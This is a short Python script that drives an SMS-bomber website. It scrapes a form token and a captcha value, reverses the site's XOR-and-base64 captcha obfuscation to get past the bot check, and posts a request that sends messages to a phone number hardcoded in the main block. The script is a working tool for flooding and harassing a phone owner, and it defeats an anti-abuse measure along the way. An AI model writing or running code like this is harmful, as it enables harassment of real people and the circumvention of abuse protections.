import requests
import re
import base64
import time

def debug_bomb(mobile_no, country_code="91"):
    url = "https://mytoolstown.com/smsbomber/"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': url
    })
    
    print("Fetching page...")
    resp = session.get(url)
    token = re.search(r'name="_token" value="([^"]+)"', resp.text).group(1)
    captcha = re.search(r'var captcha = "([^"]+)"', resp.text).group(1)
    
    # Encrypt
    res = ""
    for char in captcha:
        res += chr(ord(char) ^ 0x33)
    b2 = base64.b64encode(base64.b64encode(res.encode('latin1')).decode('ascii').encode('latin1')).decode('ascii')[::-1]
    
    payload = {
        'country_code': country_code,
        'mobno': mobile_no,
        'count': '1',
        '_token': token,
        'sent_count': '0',
        'wait_sec': '1000',
        'captcha': b2
    }
    
    print("Sending POST...")
    post_resp = session.post(url, data=payload)
    print(f"Status: {post_resp.status_code}")
    
    try:
        rev = post_resp.text[::-1]
        decoded_b64 = base64.b64decode(rev)
        
        with open("response.json", "wb") as f:
            f.write(decoded_b64)
            
        print("Wrote decrypted response to response.json")
    except Exception as e:
        print(f"Error: {e}")
        print(f"Error: {e}")
        print(f"Raw Response: {post_resp.text}")

if __name__ == "__main__":
    debug_bomb("9226671722")
